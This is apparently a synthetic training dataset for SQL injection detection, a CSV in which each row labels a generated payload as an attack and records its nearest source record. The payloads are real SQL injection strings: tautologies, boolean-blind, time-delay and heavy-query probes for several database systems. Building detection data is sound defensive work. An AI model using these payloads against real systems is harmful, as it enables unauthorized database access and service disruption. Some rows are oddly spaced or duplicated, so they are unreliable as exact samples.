id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000049,attack,boolean,"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000944,0.08329136962928045
SMOTE_000050,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",nearest_attack_euclidean,R000405,0.48525416709125263
SMOTE_000051,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000034,0.016262090683629875
SMOTE_000052,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000234,1.6768427940611637
SMOTE_000053,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",nearest_attack_euclidean,R002377,0.0020157065458629476
SMOTE_000054,attack,boolean,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",nearest_attack_euclidean,R001777,0.019707842348087864
SMOTE_000055,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",nearest_attack_euclidean,R002250,0.10233418393209863
SMOTE_000056,attack,boolean,"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R003609,0.553512435520627
SMOTE_000057,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R002511,0.0
SMOTE_000058,attack,boolean," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000157,0.8822718022811309
SMOTE_000059,attack,boolean,"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk",nearest_attack_euclidean,R002632,0.29543985951875196
SMOTE_000060,attack,boolean,"1""  )   where 5828  =  5828 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003203,0.08389354633272812
SMOTE_000061,attack,boolean,"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001261,0.16343843690599374
SMOTE_000062,attack,boolean,"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000498,0.012271650285044594
SMOTE_000063,attack,boolean,"1"" and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R001101,0.016153416868760196
SMOTE_000064,attack,boolean, or userid like '%,nearest_attack_euclidean,R000189,0.003904843447859559
SMOTE_000065,attack,boolean,"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk",nearest_attack_euclidean,R002300,0.19860997549548978
SMOTE_000066,attack,boolean,"1""  )   as jrse where 9185  =  9185 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R002027,0.21507778710501071
SMOTE_000067,attack,boolean,"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R002369,0.6840994346603221
SMOTE_000068,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000595,0.57032854609519
SMOTE_000069,attack,boolean,"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'lxqz'  =  'lxqz",nearest_attack_euclidean,R002489,0.12574967029723355
SMOTE_000070,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",nearest_attack_euclidean,R003072,1.476191075183267
SMOTE_000071,attack,boolean,"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003158,0.14232287911006672
SMOTE_000072,attack,boolean,1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000965,0.2102870115824272
SMOTE_000073,attack,boolean,"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002629,0.5072066600353692
SMOTE_000074,attack,boolean,"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000302,0.09889213279579989
SMOTE_000075,attack,boolean,"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000740,0.7552794432426614
SMOTE_000076,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,8.429369702178807e-08
SMOTE_000077,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,8.429369702178807e-08
SMOTE_000078,attack,boolean,"-5014""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dkyp"" like ""dkyp",nearest_attack_euclidean,R000827,0.032260968345935774
SMOTE_000079,attack,boolean,"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001963,0.1474406111738777
SMOTE_000080,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002712,0.048339741988790666
SMOTE_000081,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,0.07020612016333856
SMOTE_000082,attack,boolean,"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003129,0.029114452340717266
SMOTE_000083,attack,boolean,"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk",nearest_attack_euclidean,R002300,0.19998699223556685
SMOTE_000084,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",nearest_attack_euclidean,R002898,0.15231193837332993
SMOTE_000085,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",nearest_attack_euclidean,R002373,0.22296129028502376
SMOTE_000086,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002901,0.1318674124322004
SMOTE_000087,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000316,0.6215532322604916
SMOTE_000088,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000865,0.49165982469650477
SMOTE_000089,attack,boolean,"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002181,0.16291243148994308
SMOTE_000090,attack,boolean,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,nearest_attack_euclidean,R000069,0.0
SMOTE_000091,attack,boolean,"1%""   )    )     )   and 1594  =  8757",nearest_attack_euclidean,R003096,0.7162411880324444
SMOTE_000092,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000234,0.8162432652885822
SMOTE_000093,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,0.058602543873740205
SMOTE_000094,attack,boolean,"-2803'  )   as jciy where 1130  =  1130 or make_set  (  4599  =  6550,6550  )  --",nearest_attack_euclidean,R002795,0.21870791212765395
SMOTE_000095,attack,boolean,-6843' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eeff'  =  'eeff,nearest_attack_euclidean,R001706,0.20919549507775564
SMOTE_000096,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001445,0.050938420302835824
SMOTE_000097,attack,boolean,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,nearest_attack_euclidean,R001994,0.25904083556511215
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000058,0.23152366168919655
SMOTE_000099,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000361,0.23498221828712354
SMOTE_000100,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000793,0.3310153699943895
SMOTE_000101,attack,boolean,"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002743,0.6752021322234255
SMOTE_000102,attack,boolean,"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001967,0.1147311989762853
SMOTE_000103,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,8.429369702178807e-08
SMOTE_000104,attack,boolean,1'  )   where 5287  =  5287 and 7533  =  7533--,nearest_attack_euclidean,R002310,0.04003117542718986
SMOTE_000105,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R003489,0.3992917264832485
SMOTE_000106,attack,boolean,"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R001407,0.9319518844688245
SMOTE_000107,attack,boolean,"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000886,0.1693708718772621
SMOTE_000108,attack,boolean,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002157,0.19046926090995622
SMOTE_000109,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R002391,1.6919954045408696
SMOTE_000110,attack,boolean,1 where 3802  =  3802 and 2006  =  2006,nearest_attack_euclidean,R001069,0.34845557930875437
SMOTE_000111,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R003343,0.041016788620249156
SMOTE_000112,attack,boolean,-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,nearest_attack_euclidean,R001685,0.18946011765562767
SMOTE_000113,attack,boolean,"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- lxey",nearest_attack_euclidean,R002821,0.34144191031097637
SMOTE_000114,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt",nearest_attack_euclidean,R000601,0.06714078697467975
SMOTE_000115,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",nearest_attack_euclidean,R001440,0.2242598044169469
SMOTE_000116,attack,boolean,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",nearest_attack_euclidean,R003450,0.3855073179077935
